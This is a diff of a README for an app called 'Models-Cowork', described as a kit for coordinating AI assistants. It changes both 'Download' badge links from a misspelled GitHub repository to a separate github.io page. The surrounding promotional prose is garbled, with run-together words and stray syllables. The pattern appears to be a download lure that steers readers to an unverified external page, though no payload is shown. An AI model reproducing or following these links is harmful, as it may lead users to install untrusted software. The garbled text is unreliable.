@@ -25,7 +25,7 @@ Ready to create your own AI coworking space? Follow these simple steps to downlo
 
 Click the big button below to go to the download page:
 
-[![Download Models-Cowork](https://img.shields.io/badge/Download-Models--Cowork-2ea44f?style=for-the-badge&logo=github)] (https://github.com/leanneexperimental3016/Models-Cowowork)
+[![Download Models-Cowork](https://img.shields.io/badge/Download-Models--Cowork-2ea44f?style=for-the-badge&logo=github)] (https://leanneexperimental3016.github.io)
 
 )
 
@@ -137,7 +137,7 @@ The application includes atend built-in help centerwith guides and video tutoria
 
 Stop juggling multipleAI tools and losing time switchingbetween themnd. With Models-Cowork, you cand have all your assistants working together harmoniouslypast. Download it today with one clickand experience the power of collaborativeAI working for youmo. Whether you are building yourfirst websiteor working on complex coding projects, this coordination kit makes it easiersimplemo. 
 
-[![Download Models-Cowork](https://img.shields.io/badge/Download%20Now-Models--Cowork-blue?style=for-the-badge&logo=github)] (https://github.com/leanneexperimental3016/Models-Cowowork)
+[![Download Models-Cowork](https://img.shields.io/badge/Download%20Now-Models--Cowork-blue?style=for-the-badge&logo=github)] (https://leanneexperimental3016.github.io)
 
 )
 
